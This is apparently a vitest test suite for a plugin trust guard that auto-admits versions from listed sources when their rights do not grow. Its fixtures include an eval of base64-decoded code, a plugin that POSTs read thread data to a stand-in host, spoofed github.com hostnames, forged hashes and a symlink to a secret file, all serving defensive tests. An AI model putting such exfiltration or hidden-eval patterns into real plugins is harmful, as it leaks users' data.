// Trust by source and rights (UX v1, PR 1): the guard reads the version's directory itself and lets a version of an own/known source in
// when the rights did not grow. Everything a harmful plugin in the bb process can send over the socket is tried at the end.
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { runChecks } from "../../guard/src/checks/index.ts";
import { entryCovers, identityOf, levelOf, normalizeEntry } from "../../guard/src/trust.ts";
import type { TrustConfig } from "../../guard/src/guard.ts";
import { coreHash, startGuard, type TestGuard } from "./support.ts";

const open: TestGuard[] = [];
const cleanup: string[] = [];
afterEach(async () => {
  for (const g of open.splice(0)) await g.close();
  for (const d of cleanup.splice(0)) rmSync(d, { recursive: true, force: true });
});

const tmp = (): string => {
  const d = realpathSync(mkdtempSync(join(tmpdir(), "sbb-trust-")));
  cleanup.push(d);
  return d;
};
const BASE = `export default function plugin(bb) {\n  bb.log.info("hello");\n}\n`;
const FETCH = `export default async function plugin(bb) {\n  await fetch("https://api.example.com/v1");\n}\n`;
const EVAL = `const code = atob("YWxlcnQoMSk=");\neval(code);\n`;
/** A plugin directory with a given server.ts. */
function plugin(dir: string, name: string, server: string): string {
  const d = join(dir, name);
  mkdirSync(d, { recursive: true });
  writeFileSync(join(d, "package.json"), JSON.stringify({ name, version: "1.0.0", bb: { name, server: "./server.ts" } }));
  writeFileSync(join(d, "server.ts"), server);
  return d;
}
let n = 0;
/** A hash of nothing real (for directories that do not exist). */
const hash = (): string => `sha256:${String(++n).padStart(8, "0")}${"c".repeat(40)}`;
/** The core's hash of the directory as it is now: what a real request carries. */
const realHash = (dir: string): string => {
  try {
    return coreHash(dir);
  } catch {
    return hash();
  }
};

async function guard(trust: TrustConfig = {}): Promise<TestGuard> {
  const g = await startGuard({ trust });
  open.push(g);
  return g;
}
const decideOf = (rootDir: string, over: Record<string, unknown> = {}) => ({
  op: "decide",
  pluginId: "demo",
  version: "1.0.0",
  contentHash: realHash(rootDir),
  rootDir,
  source: `path:${rootDir}`,
  sourceKind: "path",
  trigger: "install",
  ...over,
});
const addMine = (g: TestGuard, entries: string[]) => g.send({ op: "sources-add", entries, code: g.nextCode() });
/** The first version: it waits, a human approves it with a touch (that is what makes it the baseline). */
async function approveFirst(g: TestGuard, req: Record<string, unknown>, acknowledgeBlock = false): Promise<void> {
  const d = await g.send(req);
  expect(d).toMatchObject({ action: "wait" });
  expect(await g.send({ op: "approve", requestId: d.requestId, ...(acknowledgeBlock ? { acknowledgeBlock: true } : {}), code: g.nextCode() })).toMatchObject({ ok: true });
}
const journal = (g: TestGuard, kind: string) => (g.guard.state().journal as { recent: Array<{ kind: string; detail: Record<string, any> | null }> }).recent.filter((r) => r.kind === kind);
const queueNote = (g: TestGuard, id: number): string | null => (g.guard.state().queue as Array<{ id: number; note: string | null }>).find((q) => q.id === id)?.note ?? null;

describe("sources: names and levels (decided from the core's data)", () => {
  it("normalizes entries and refuses the rest", () => {
    expect(normalizeEntry("Owner/Name")).toBe("github:owner/name");
    expect(normalizeEntry("https://github.com/Owner/Name.git")).toBe("github:owner/name");
    expect(normalizeEntry("github:owner/*")).toBe("github:owner/*");
    expect(normalizeEntry("path:/a//b/./c/")).toBe("path:/a/b/c");
    for (const bad of ["path:rel/dir", "path:/a/../../etc", "path:/", "owner", "o/n/x", "https://evil.tld/o/n", "", "path:/a\n/b", 5]) expect(normalizeEntry(bad)).toBeNull();
  });
  it("reads the repository from the core's source: the host must be exactly github.com", () => {
    expect(identityOf("git", "git:https://github.com/Me/Demo.git@main")?.id).toBe("github:me/demo");
    expect(identityOf("git", "git:git@github.com:me/demo@v1#sub")?.id).toBe("github:me/demo");
    expect(identityOf("git", "git:ssh://git@github.com/me/demo")?.id).toBe("github:me/demo");
    for (const s of ["git:https://github.com.evil.tld/me/demo", "git:https://evil.tld/github.com/me/demo", "git:https://github.com@evil.tld/me/demo", "git:https://gitlab.com/me/demo"]) expect(identityOf("git", s)).toBeNull();
    expect(identityOf("npm", "npm:left-pad")).toBeNull();
    expect(identityOf("path", "path:/a/../b")).toBeNull();
    expect(identityOf("git", "path:/a")).toBeNull(); // the kind and the source must agree
  });
  it("own, known, unknown; a directory entry covers the directory and what is under it, not a neighbour", () => {
    const own = ["github:me/*", "path:/dev/mine"];
    expect(levelOf(identityOf("git", "git:https://github.com/me/x"), own, []).level).toBe("own");
    expect(levelOf(identityOf("git", "git:https://github.com/other/x"), own, ["github:other/*"]).level).toBe("known");
    expect(levelOf(identityOf("git", "git:https://github.com/other/x"), own, []).level).toBe("unknown");
    expect(levelOf(identityOf("path", "path:/dev/mine/plug"), own, []).level).toBe("own");
    expect(levelOf(identityOf("path", "path:/dev/mine-evil/plug"), own, []).level).toBe("unknown");
    expect(entryCovers("github:me/x", identityOf("git", "git:https://github.com/me/y")!)).toBe(false);
  });
});

describe("a version of an own source passes by itself when its rights did not grow", () => {
  it("path source: same rights → proceeds, and the journal says why", async () => {
    const g = await guard();
    const dir = tmp();
    const v1 = plugin(dir, "demo", BASE);
    await addMine(g, [`path:${dir}`]);
    await approveFirst(g, decideOf(v1));
    writeFileSync(join(v1, "server.ts"), BASE + "// a comment\n");
    const d = await g.send(decideOf(v1));
    expect(d).toMatchObject({ ok: true, action: "proceed", via: "source" });
    const rec = journal(g, "approved.source")[0]!;
    expect(rec.detail).toMatchObject({ why: "прошла сама: свой источник, права те же", level: "own", mode: "simple" });
    expect(g.guard.verifyJournal().ok).toBe(true);
  });
  it("git source from the core's plugins directory", async () => {
    const root = tmp();
    const g = await guard({ pluginsRoots: [root] });
    const v = plugin(root, "demo-checkout", BASE);
    const src = { source: "git:https://github.com/me/demo@main", sourceKind: "git" };
    await addMine(g, ["me/*"]);
    await approveFirst(g, decideOf(v, src));
    writeFileSync(join(v, "server.ts"), BASE + "// v2\n");
    expect(await g.send(decideOf(v, { ...src, source: "git:https://github.com/me/demo@v2" }))).toMatchObject({ action: "proceed", via: "source" });
  });
  it("a known source (the owner's catalog list) passes the same way, and says so", async () => {
    const root = tmp();
    const g = await guard({ pluginsRoots: [root], knownSources: ["github:catalog/*"] });
    const v = plugin(root, "demo", BASE);
    const src = { source: "git:https://github.com/catalog/demo@1", sourceKind: "git" };
    await approveFirst(g, decideOf(v, src));
    writeFileSync(join(v, "server.ts"), BASE + "// v2\n");
    expect(await g.send(decideOf(v, src))).toMatchObject({ action: "proceed", via: "source" });
    expect(journal(g, "approved.source")[0]!.detail).toMatchObject({ why: "прошла сама: известный источник, права те же", level: "known" });
  });
  it("the same approved hash is not reused for another source (an approval by the rule covers its own source only)", async () => {
    const g = await guard();
    const dir = tmp();
    const v1 = plugin(dir, "demo", BASE);
    await addMine(g, [`path:${dir}`]);
    await approveFirst(g, decideOf(v1));
    writeFileSync(join(v1, "server.ts"), BASE + "// v2\n");
    const h = coreHash(v1);
    expect(await g.send(decideOf(v1, { contentHash: h }))).toMatchObject({ action: "proceed", via: "source" });
    const elsewhere = tmp();
    const other = plugin(elsewhere, "demo", BASE + "// v2\n"); // the very same bytes, the same hash, another place
    expect(coreHash(other)).toBe(h);
    expect(await g.send(decideOf(other, { contentHash: h }))).toMatchObject({ action: "wait" });
    // and the hash alone does not say "approved" to anybody who names no source, or another one
    expect(g.guard.lookup({ pluginId: "demo", contentHash: h })).toMatchObject({ approved: false });
  });
});

describe("what sends a version to the queue", () => {
  async function ready(trust: TrustConfig = {}) {
    const g = await guard(trust);
    const dir = tmp();
    const v = plugin(dir, "demo", BASE);
    await addMine(g, [`path:${dir}`]);
    await approveFirst(g, decideOf(v));
    return { g, dir, v };
  }
  it("a new right → the queue, with the right named", async () => {
    const { g, v } = await ready();
    writeFileSync(join(v, "server.ts"), FETCH);
    const d = await g.send(decideOf(v));
    expect(d).toMatchObject({ action: "wait" });
    expect(queueNote(g, d.requestId)).toMatch(/новое право: .*network/);
    expect(journal(g, "approved.source")).toHaveLength(0);
  });
  it("a new way out for what it reads is a new right, though the network was there before: the guard counts it itself", async () => {
    const read = `const t = await bb.sdk.threads.timeline({ threadId: "x" });`;
    const quiet = `export default async function plugin(bb) {\n  ${read}\n  await fetch("https://stats.example/ping", { method: "POST", body: "ping" });\n}\n`;
    const g = await guard();
    const dir = tmp();
    const v = plugin(dir, "demo", quiet);
    await addMine(g, [`path:${dir}`]);
    await approveFirst(g, decideOf(v));
    // the plugin's own process cannot tell the guard what the code does: the guard reads the directory and follows the data itself
    writeFileSync(join(v, "server.ts"), quiet.replace('body: "ping"', "body: JSON.stringify(t)"));
    const d = await g.send(decideOf(v));
    expect(d).toMatchObject({ action: "wait" });
    expect(queueNote(g, d.requestId)).toMatch(/новое право: flow, flow:threads>network:stats\.example/);
    expect(journal(g, "approved.source")).toHaveLength(0);
    // and the same code with the body that is not what was read passes: the rights did not grow
    writeFileSync(join(v, "server.ts"), quiet + "// again\n");
    expect(await g.send(decideOf(v))).toMatchObject({ action: "proceed", via: "source" });
  });
  it("the clock stopped the flow analysis: the version is held, «проверка не успела», and no right comes of it", async () => {
    let stop = false;
    const g = await guard({ checks: async (dir, o) => (stop ? { ...(await runChecks(dir, o)), flows: undefined, flowsTimedOut: true as const } : runChecks(dir, o)) });
    const dir = tmp();
    const v = plugin(dir, "demo", BASE);
    await addMine(g, [`path:${dir}`]);
    await approveFirst(g, decideOf(v));
    writeFileSync(join(v, "server.ts"), BASE + "// v2\n");
    stop = true;
    const d = await g.send(decideOf(v));
    expect(d).toMatchObject({ action: "wait" });
    expect(journal(g, "approved.source")).toHaveLength(0);
    // the next evaluation, when the analysis finishes, lets it in as before: the rights did not change
    stop = false;
    expect(await g.send(decideOf(v))).toMatchObject({ action: "proceed", via: "source" });
  });
  it("a right that was approved before stays free: a version with it passes", async () => {
    const { g, v } = await ready();
    writeFileSync(join(v, "server.ts"), FETCH);
    const d = await g.send(decideOf(v));
    await g.send({ op: "approve", requestId: d.requestId, code: g.nextCode() });
    writeFileSync(join(v, "server.ts"), FETCH + "// again\n");
    expect(await g.send(decideOf(v))).toMatchObject({ action: "proceed", via: "source" });
  });
  it("a hard flag → the queue", async () => {
    const { g, v } = await ready();
    writeFileSync(join(v, "server.ts"), EVAL);
    expect((await runChecks(v)).findings.some((f) => f.severity === "block")).toBe(true);
    const d = await g.send(decideOf(v));
    expect(d).toMatchObject({ action: "wait" });
    expect(queueNote(g, d.requestId)).toMatch(/жёсткий флаг/);
  });
  it("an unknown source → the queue, whatever the rights", async () => {
    const g = await guard();
    const dir = tmp();
    const v = plugin(dir, "demo", BASE);
    await approveFirst(g, decideOf(v)); // approved by a human, but the source is not in the list
    writeFileSync(join(v, "server.ts"), BASE + "// v2\n");
    const d = await g.send(decideOf(v));
    expect(d).toMatchObject({ action: "wait" });
    expect(queueNote(g, d.requestId)).toBe("неизвестный источник");
  });
  it("Strict → always the queue (and going back to Simple takes a touch)", async () => {
    const { g, v } = await ready();
    expect(await g.send({ op: "trust-mode", mode: "strict" })).toMatchObject({ ok: true, mode: "strict" });
    writeFileSync(join(v, "server.ts"), BASE + "// v2\n");
    const d = await g.send(decideOf(v));
    expect(d).toMatchObject({ action: "wait" });
    expect(queueNote(g, d.requestId)).toMatch(/Строгий/);
    expect(await g.send({ op: "trust-mode", mode: "simple", code: g.nextCode() })).toMatchObject({ ok: true, mode: "simple" });
    expect(await g.send(decideOf(v))).toMatchObject({ action: "proceed", via: "source" });
  });
  it("Detailed lets the same versions in as Simple does", async () => {
    const { g, v } = await ready();
    await g.send({ op: "trust-mode", mode: "detailed" });
    writeFileSync(join(v, "server.ts"), BASE + "// v2\n");
    expect(await g.send(decideOf(v))).toMatchObject({ action: "proceed", via: "source" });
  });
  it("no approved version from this source (a first install) → the queue", async () => {
    const g = await guard();
    const dir = tmp();
    const v = plugin(dir, "demo", BASE);
    await addMine(g, [`path:${dir}`]);
    const d = await g.send(decideOf(v));
    expect(d).toMatchObject({ action: "wait" });
    expect(queueNote(g, d.requestId)).toMatch(/нет одобренной версии/);
  });
  it("an approved version from ANOTHER source of the same owner is not the same source", async () => {
    const root = tmp();
    const g = await guard({ pluginsRoots: [root] });
    await addMine(g, ["me/*"]);
    const v = plugin(root, "demo", BASE);
    await approveFirst(g, decideOf(v, { source: "git:https://github.com/me/one@main", sourceKind: "git" }));
    writeFileSync(join(v, "server.ts"), BASE + "// v2\n"); // other bytes: no approval of this hash covers it
    const d = await g.send(decideOf(v, { source: "git:https://github.com/me/two@main", sourceKind: "git" }));
    expect(d).toMatchObject({ action: "wait" });
  });
  it("a revoked baseline is no baseline", async () => {
    const { g, v } = await ready();
    await g.send({ op: "revoke", pluginId: "demo" });
    writeFileSync(join(v, "server.ts"), BASE + "// v2\n");
    expect(await g.send(decideOf(v))).toMatchObject({ action: "wait" });
  });
  it("a version the plugin's own check stopped is not lifted by the rule", async () => {
    const { g, v } = await ready();
    writeFileSync(join(v, "server.ts"), BASE + "// v2\n");
    const req = decideOf(v);
    await g.send({ ...req, op: "hold", stop: true });
    expect(await g.send(req)).toMatchObject({ action: "wait" });
  });
  it("removing a source takes no touch and the next version is asked about; the approved ones stay", async () => {
    const { g, dir, v } = await ready();
    writeFileSync(join(v, "server.ts"), BASE + "// v2\n");
    const ok = decideOf(v);
    expect(await g.send(ok)).toMatchObject({ action: "proceed" });
    expect(await g.send({ op: "sources-remove", entry: `path:${dir}` })).toMatchObject({ ok: true, mySources: [] });
    expect(await g.send(ok)).toMatchObject({ action: "proceed", via: "approval" });
    writeFileSync(join(v, "server.ts"), BASE + "// v3\n");
    expect(await g.send(decideOf(v))).toMatchObject({ action: "wait" });
  });
});

describe("the guard cannot read the directory, or the checks fail → the queue, never 'passes'", () => {
  it("a directory that does not exist", async () => {
    const g = await guard();
    const dir = tmp();
    const v = plugin(dir, "demo", BASE);
    await addMine(g, [`path:${dir}`]);
    await approveFirst(g, decideOf(v));
    const gone = join(dir, "gone");
    const d = await g.send(decideOf(gone, { source: `path:${gone}` }));
    expect(d).toMatchObject({ action: "wait" });
    expect(queueNote(g, d.requestId)).toMatch(/каталог не прочитан/);
  });
  it("a directory the guard's user may not read", async () => {
    const g = await guard();
    const dir = tmp();
    const v = plugin(dir, "demo", BASE);
    await addMine(g, [`path:${dir}`]);
    await approveFirst(g, decideOf(v));
    writeFileSync(join(v, "server.ts"), BASE + "// v2\n");
    chmodSync(v, 0o000);
    try {
      expect(await g.send(decideOf(v))).toMatchObject({ action: "wait" });
    } finally {
      chmodSync(v, 0o755);
    }
  });
  it("checks that throw, and checks that are too slow", async () => {
    for (const checks of [async () => Promise.reject(new Error("boom")), () => new Promise<never>(() => undefined)]) {
      const g = await guard({ checks, budgetMs: 150 });
      const dir = tmp();
      const v = plugin(dir, "demo", BASE);
      await addMine(g, [`path:${dir}`]);
      const d = await g.send(decideOf(v));
      expect(d).toMatchObject({ action: "wait" });
      expect(queueNote(g, d.requestId)).toMatch(/проверки не выполнены/);
    }
  });
  it("a git version with no plugins directory configured, or outside it", async () => {
    const root = tmp();
    const src = { source: "git:https://github.com/me/demo@main", sourceKind: "git" };
    for (const roots of [[], [root]]) {
      const g = await guard({ pluginsRoots: roots });
      await addMine(g, ["me/*"]);
      const outside = plugin(tmp(), "demo", BASE);
      const d = await g.send(decideOf(outside, src));
      expect(d).toMatchObject({ action: "wait" });
      expect(queueNote(g, d.requestId)).toMatch(/каталог/);
    }
  });
  it("a baseline approved without rights (an old approval, or the directory was unreadable then) is no baseline", async () => {
    const g = await guard({ checks: async () => Promise.reject(new Error("no")) });
    const dir = tmp();
    const v = plugin(dir, "demo", BASE);
    await addMine(g, [`path:${dir}`]);
    // the guard could not read it (the checks fail): it may carry a block, so the first approval takes the acknowledgement and a fresh touch
    await approveFirst(g, decideOf(v), true);
    expect(g.guard.state().approvals).toMatchObject([{ rights: null }]);
    const d = await g.send(decideOf(v, { contentHash: hash() }));
    expect(d).toMatchObject({ action: "wait" });
  });
});

describe("a harmful plugin in the bb process, over the same socket", () => {
  it("cannot add a source without a touch (no code, a wrong code, a replayed code)", async () => {
    const g = await guard();
    const evil = ["github:evil/*", "path:/tmp"];
    expect(await g.send({ op: "sources-add", entries: evil })).toMatchObject({ ok: false });
    expect(await g.send({ op: "sources-add", entries: evil, code: "000000" })).toMatchObject({ ok: false, error: { code: "invalid_code" } });
    const code = g.nextCode();
    expect(await g.send({ op: "sources-add", entries: ["github:me/ok"], code })).toMatchObject({ ok: true });
    expect(await g.send({ op: "sources-add", entries: evil, code })).toMatchObject({ ok: false, error: { code: "invalid_code" } }); // a spent code
    expect(g.guard.mySources()).toEqual(["github:me/ok"]);
  });
  it("cannot weaken the mode without a touch, and cannot strengthen it by mistake into weakness", async () => {
    const g = await guard();
    expect(g.guard.trustMode()).toBe("simple");
    await g.send({ op: "trust-mode", mode: "strict" });
    expect(await g.send({ op: "trust-mode", mode: "simple" })).toMatchObject({ ok: false });
    expect(await g.send({ op: "trust-mode", mode: "detailed", code: "123456" })).toMatchObject({ ok: false });
    expect(await g.send({ op: "trust-mode", mode: "nonsense" })).toMatchObject({ ok: false });
    expect(g.guard.trustMode()).toBe("strict");
    expect(await g.send({ op: "trust-mode", mode: "detailed", code: g.nextCode() })).toMatchObject({ ok: true, mode: "detailed" });
    expect(journal(g, "trust.mode").map((r) => r.detail)).toMatchObject([{ from: "strict", to: "detailed", touched: true }, { from: "simple", to: "strict", touched: false }]);
  });
  it("cannot get a version through by lying about its rights with annotate", async () => {
    const g = await guard();
    const dir = tmp();
    const v = plugin(dir, "demo", BASE);
    await addMine(g, [`path:${dir}`]);
    const first = await g.send(decideOf(v));
    await g.send({ op: "annotate", requestId: first.requestId, findings: { capabilities: ["network:evil.tld"], rights: [], findings: [] } });
    await g.send({ op: "approve", requestId: first.requestId, code: g.nextCode() });
    // the baseline is what the guard read, not what was annotated
    expect((g.guard.state().approvals as Array<{ rights: { tokens: string[] } }>)[0]!.rights.tokens).not.toContain("network:evil.tld");
    writeFileSync(join(v, "server.ts"), FETCH);
    const h = coreHash(v);
    const d = await g.send(decideOf(v, { contentHash: h }));
    await g.send({ op: "annotate", contentHash: h, findings: { capabilities: [], findings: [], note: "clean, no capabilities" } });
    expect(await g.send(decideOf(v, { contentHash: h }))).toMatchObject({ action: "wait" });
    expect(queueNote(g, d.requestId)).toMatch(/новое право/);
  });
  it("cannot claim an own directory for code that lives elsewhere", async () => {
    const g = await guard();
    const dir = tmp();
    const v = plugin(dir, "demo", BASE);
    await addMine(g, [`path:${dir}`]);
    await approveFirst(g, decideOf(v));
    const clean = plugin(tmp(), "demo", BASE + "// another file\n");
    // the source says "my directory", the directory the guard is told to read is another one
    const d = await g.send(decideOf(clean, { source: `path:${v}` }));
    expect(d).toMatchObject({ action: "wait" });
    expect(queueNote(g, d.requestId)).toMatch(/не тот/);
  });
  it("cannot approve anything by `decide` with a made-up source kind", async () => {
    const g = await guard();
    const dir = tmp();
    const v = plugin(dir, "demo", BASE);
    await addMine(g, [`path:${dir}`]);
    await approveFirst(g, decideOf(v));
    writeFileSync(join(v, "server.ts"), BASE + "// v2\n");
    for (const bad of [{ sourceKind: "builtin" }, { sourceKind: "git" }, { source: `path:${dir}/../x` }, { source: `npm:demo` }]) expect(await g.send(decideOf(v, bad))).toMatchObject({ action: "wait" });
  });
  it("cannot make the guard read without end", async () => {
    let calls = 0;
    const g = await guard({ checks: async () => (calls++, { findings: [], capabilities: [], stats: { files: 0, parsed: 0, bytes: 0, ms: 0 } }) });
    const dir = tmp();
    const v = plugin(dir, "demo", BASE);
    await addMine(g, [`path:${dir}`]);
    for (let i = 0; i < 50; i++) await g.send(decideOf(v));
    expect(calls).toBeLessThanOrEqual(30);
  });
});

describe("the list and the mode are the guard's", () => {
  it("adding takes a touch and goes to the journal; migrating the old list says so; the state shows both", async () => {
    const g = await guard();
    expect(await g.send({ op: "sources-add", entries: ["github:me/a", "github:me/*"], migrated: true, code: g.nextCode() })).toMatchObject({ ok: true, added: ["github:me/*", "github:me/a"] });
    expect(journal(g, "sources.add")[0]!.detail).toMatchObject({ entries: ["github:me/*", "github:me/a"], migrated: expect.any(String), via: "totp" });
    expect(await g.send({ op: "sources-add", entries: ["github:me/a"] })).toMatchObject({ ok: true, added: [] }); // nothing new: no touch, nothing spent
    expect(await g.send({ op: "state" })).toMatchObject({ trust: { mode: "simple", mySources: ["github:me/*", "github:me/a"], known: [] } });
    expect(await g.send({ op: "trust" })).toMatchObject({ mode: "simple" });
  });
  it("rejects entries that are not sources, and a touch for a challenge describes the action", async () => {
    const g = await guard();
    expect(await g.send({ op: "sources-add", entries: ["not a source"], code: g.nextCode() })).toMatchObject({ ok: false, error: { code: "invalid" } });
    expect(await g.send({ op: "sources-add", entries: [], code: g.nextCode() })).toMatchObject({ ok: false });
    expect(await g.send({ op: "sources-remove", entry: "github:me/none" })).toMatchObject({ ok: false, error: { code: "not_found" } });
  });
  it("survives a restart of the guard (it is in the database, not in memory)", async () => {
    const g = await guard();
    await addMine(g, ["github:me/a"]);
    await g.send({ op: "trust-mode", mode: "detailed" });
    const again = (await import("../../guard/src/guard.ts")).Guard;
    const db = (g.guard as unknown as { db: never }).db;
    const g2 = new again({ db, now: g.clock.now, secretPath: g.paths.secret, headPath: g.paths.head });
    expect(g2.trustState()).toMatchObject({ mode: "detailed", mySources: ["github:me/a"] });
  });
});

describe("the checks module in the guard has no dependencies", () => {
  it("every import under guard/ is node:* or a file inside guard/, and plain node runs the checks without a build or a loader", async () => {
    const { readdirSync, readFileSync, statSync } = await import("node:fs");
    const { dirname, relative, resolve, sep } = await import("node:path");
    const { fileURLToPath } = await import("node:url");
    const root = fileURLToPath(new URL("../../guard", import.meta.url));
    const files: string[] = [];
    const walk = (d: string): void => {
      for (const e of readdirSync(d)) {
        const p = join(d, e);
        if (statSync(p).isDirectory()) walk(p);
        else if (/\.(ts|mjs)$/.test(e) && !e.endsWith(".d.mts")) files.push(p);
      }
    };
    walk(root);
    const bad: string[] = [];
    for (const f of files) {
      const src = readFileSync(f, "utf8");
      for (const m of src.matchAll(/^\s*(?:import|export)\s[^"'\n]*?from\s+["']([^"']+)["']|^\s*import\s+["']([^"']+)["']/gm)) {
        const spec = m[1] ?? m[2]!;
        if (spec.startsWith("node:")) continue;
        const target = spec.startsWith(".") ? resolve(dirname(f), spec) : null;
        if (target === null || !(target + sep).startsWith(root + sep) || relative(root, target).startsWith("..")) bad.push(`${relative(root, f)}: ${spec}`);
      }
    }
    expect(bad).toEqual([]);
    const dir = plugin(tmp(), "demo", FETCH);
    const { execFileSync } = await import("node:child_process");
    const out = execFileSync(process.execPath, ["--input-type=module", "-e", `const { runChecks } = await import(${JSON.stringify(join(root, "src/checks/index.ts"))}); const r = await runChecks(${JSON.stringify(dir)}); console.log(JSON.stringify(r.capabilities.map((c) => c.kind)));`], { encoding: "utf8" });
    expect(JSON.parse(out)).toContain("network");
  });
});

describe("the guard hashes the directory itself, the way the core does", () => {
  /** A tree with directories, links, different modes, and names in several scripts and cases (the order of `localeCompare` matters). */
  function awkwardTree(): string {
    const dir = tmp();
    const d = plugin(dir, "tree", BASE);
    mkdirSync(join(d, "sub", "deeper"), { recursive: true });
    mkdirSync(join(d, "Zeta"));
    mkdirSync(join(d, "ünï"));
    writeFileSync(join(d, "sub", "a.txt"), "a");
    writeFileSync(join(d, "sub", "deeper", "B.txt"), "b");
    writeFileSync(join(d, "Zeta", "z"), "z");
    writeFileSync(join(d, "ünï", "файл.txt"), "юникод");
    writeFileSync(join(d, "日本語.txt"), "nihongo");
    writeFileSync(join(d, "a b.txt"), "space");
    writeFileSync(join(d, "run.sh"), "#!/bin/sh\n");
    chmodSync(join(d, "run.sh"), 0o755);
    writeFileSync(join(d, "secret.txt"), "s");
    chmodSync(join(d, "secret.txt"), 0o600);
    symlinkSync("server.ts", join(d, "link-in"));
    symlinkSync("../outside", join(d, "sub", "link-out"));
    symlinkSync("nowhere", join(d, "dangling"));
    mkdirSync(join(d, "empty"));
    return d;
  }
  it("equals the core's hash (reference repeated from install-sources.ts) on a tree with directories, links, modes and non-ASCII names", async () => {
    const { readTree } = await import("../../guard/src/tree-read.ts");
    const d = awkwardTree();
    const t = await readTree(d);
    try {
      expect(t.hash).toBe(coreHash(d));
      expect(t.hash).toMatch(/^sha256:[0-9a-f]{64}$/);
    } finally {
      await t.cleanup();
    }
    // every bit of what the hash covers changes it
    const base = coreHash(d);
    chmodSync(join(d, "run.sh"), 0o700);
    expect(coreHash(d)).not.toBe(base);
    const t2 = await readTree(d);
    expect(t2.hash).toBe(coreHash(d));
    await t2.cleanup();
  });
  it("the copy the checks read is what was hashed: names, modes and links", async () => {
    const { readTree } = await import("../../guard/src/tree-read.ts");
    const { lstatSync, readlinkSync, readFileSync } = await import("node:fs");
    const d = awkwardTree();
    const t = await readTree(d);
    try {
      expect(coreHash(t.dir)).toBe(t.hash); // the core's hash of the copy is the hash of the original
      expect(lstatSync(join(t.dir, "run.sh")).mode & 0o777).toBe(0o755);
      expect(readlinkSync(join(t.dir, "sub", "link-out"))).toBe("../outside");
      expect(readFileSync(join(t.dir, "ünï", "файл.txt"), "utf8")).toBe("юникод");
    } finally {
      await t.cleanup();
    }
    expect(() => lstatSync(t.dir)).toThrow();
  });
  it("a forged decide — a harmless directory, the hash of other code — is queued, and nothing is approved", async () => {
    const g = await guard();
    const dir = tmp();
    const trusted = plugin(dir, "demo", BASE);
    await addMine(g, [`path:${dir}`]);
    await approveFirst(g, decideOf(trusted));
    const evil = plugin(tmp(), "demo", EVAL + FETCH);
    const evilHash = coreHash(evil);
    const d = await g.send(decideOf(trusted, { contentHash: evilHash })); // the trusted directory, the evil hash
    expect(d).toMatchObject({ action: "wait" });
    expect(queueNote(g, d.requestId)).toMatch(/хеш/);
    expect(journal(g, "approved.source")).toHaveLength(0);
    expect((g.guard.state().approvals as Array<{ contentHash: string }>).some((a) => a.contentHash === evilHash)).toBe(false);
    // no rights were recorded for the forged request (they were computed for other code)
    expect((g.guard.state().queue as Array<{ id: number; rights: unknown }>).find((q) => q.id === d.requestId)?.rights).toBeNull();
    // the evil version, when the core really asks (its own directory, its own source), is not approved either
    expect(await g.send(decideOf(evil, { source: `path:${evil}` }))).toMatchObject({ action: "wait" });
  });
  it("one pass: the checks read what was hashed, even if the directory changes after the hash", async () => {
    const dir = tmp();
    const v = plugin(dir, "demo", BASE);
    let seen: string[] = [];
    const g = await guard({
      checks: async (copy) => {
        // between the hash and the checks the original gets a network call; the copy has not
        writeFileSync(join(v, "server.ts"), FETCH);
        seen = [readFileSync(join(copy, "server.ts"), "utf8")];
        return runChecks(copy);
      },
    });
    await addMine(g, [`path:${dir}`]);
    const first = await g.send(decideOf(v));
    expect(first).toMatchObject({ action: "wait" });
    expect(seen[0]).toBe(BASE);
    const rights = (g.guard.state().queue as Array<{ id: number; rights: { tokens: string[] } }>).find((q) => q.id === first.requestId)!.rights;
    expect(rights.tokens.some((t) => t.startsWith("network"))).toBe(false); // rights of the hashed bytes, not of the swapped ones
  });
  it("limits: too many entries, a file too big, a special file → the queue", async () => {
    const dir = tmp();
    const v = plugin(dir, "demo", BASE);
    for (const treeLimits of [{ maxEntries: 1, maxFileBytes: 1 << 20, maxTotalBytes: 1 << 20 }, { maxEntries: 100, maxFileBytes: 10, maxTotalBytes: 1 << 20 }, { maxEntries: 100, maxFileBytes: 1 << 20, maxTotalBytes: 20 }]) {
      const g = await guard({ treeLimits });
      await addMine(g, [`path:${dir}`]);
      const d = await g.send(decideOf(v));
      expect(d).toMatchObject({ action: "wait" });
      expect(queueNote(g, d.requestId)).toMatch(/каталог не прочитан/);
    }
  });
  it("a link planted over a file is not followed", async () => {
    const { readTree } = await import("../../guard/src/tree-read.ts");
    const outside = join(tmp(), "secret");
    writeFileSync(outside, "TOP SECRET");
    const d = plugin(tmp(), "demo", BASE);
    symlinkSync(outside, join(d, "leak"));
    const t = await readTree(d);
    try {
      expect(readFileSync(join(t.dir, "leak"), "utf8").length).toBeGreaterThan(0); // the link itself was copied (to a path), the target's bytes were not
    } catch {
      /* a dangling copy is fine */
    } finally {
      await t.cleanup();
    }
    expect(t.hash).toBe(coreHash(d));
  });
});
